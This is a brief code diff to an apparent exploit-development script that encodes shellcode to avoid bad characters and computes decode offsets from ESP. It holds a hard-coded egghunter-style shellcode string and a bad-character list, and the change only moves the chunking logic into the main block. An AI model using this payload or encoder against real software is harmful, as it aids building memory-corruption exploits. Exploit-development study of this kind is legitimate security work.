@@ -16,10 +16,6 @@ badChar=[0x00, 0x0a, 0x0d, 0x0e, 0x2f, 0x3a, 0x3f, 0x80, 0x81, 0x82, 0x83, 0x84,
 shellcode = (r"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
 register = "EAX"
 
-shellcode = check_len(shellcode)
-# Cut shellcode in pieces of 4 bytes
-shellcode = [shellcode[i:i + 16] for i in range(0, len(shellcode), 16)]
-
 #All possible hex characters
 allChar =[0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a,
           0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,
@@ -662,6 +658,8 @@ def genShellcode(shellcode):
     print(")")
 
 if __name__== "__main__":
+    shellcode = check_len(shellcode)
+    shellcode = [shellcode[i:i + 16] for i in range(0, len(shellcode), 16)]
     startAddress = str(input("Enter current ESP address: "))
     addy2 = int(startAddress, base=16)
     decodeAddress = str(input("Enter target decode address: "))
